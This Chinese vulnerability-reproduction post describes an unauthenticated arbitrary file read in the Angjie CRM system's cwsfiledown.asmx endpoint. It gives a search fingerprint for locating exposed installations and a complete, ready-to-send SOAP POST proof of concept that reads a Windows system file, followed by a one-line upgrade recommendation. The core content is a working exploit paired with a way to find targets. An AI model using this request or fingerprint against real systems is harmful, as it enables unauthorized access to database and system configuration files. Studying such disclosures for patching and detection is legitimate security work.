#  昂捷CRM系统存在任意文件读取漏洞 附POC  
原创 安服仔  北风漏洞复现文库   2026-01-07 16:04  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
昂捷CRM系统 任意文件读取漏洞  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLwGf6IhsCUZdEibo6Z2zouB4jAMo1y6SS0mG06baehEDfDObeRxIj4mOF5pTLDydiahbNVSibKlkADw/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞简介  
  
昂捷CRM系统是深圳市昂捷信息技术股份有限公司为零售行业打造的客户关系管理解决方案，集成了客户信息管理、会员营销、  
客户服务等功  
能。昂捷  
CRM  
系统  
cwsfiledown.asmx  
接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
  
  
  
04  
  
—  
  
资产测绘  
```
body="/ClientBin/slEnjoy.App.xap"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLwGf6IhsCUZdEibo6Z2zouBuE6nwZGdZJISpicUykyVAwkBPLHggic4XHj6RmaTSKrLyntN7jQfcXBw/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
 POC  
  
```
POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
Host: 域名:端口
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SL_G_WPT_TO=en; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1
Connection: close
Content-Type: text/xml; charset=utf-8
Content-Length: 643

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownFileBytes xmlns="http://tempuri.org/">
      <sFileName>c://windows//win.ini</sFileName>
      <iPosition>1</iPosition>
      <iReadBytesLen>100</iReadBytesLen>
      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
    </DownFileBytes>
  </soap:Body>
</soap:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLwGf6IhsCUZdEibo6Z2zouBz0DzD8Tw68ItfXVg9haROX5LjcgSUqelSLtnwhibtH4HE2GWicSd4llA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLwGf6IhsCUZdEibo6Z2zouBN1YGibvZXfjG4TibxQSmia9ktt17pA8SKXjEb6ibVKBicMauPy9q9fZh9icw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
  
升级系统至官方发布的安全版本。  
  
07  
  
—  
  
往期回顾  
  
  
  
  
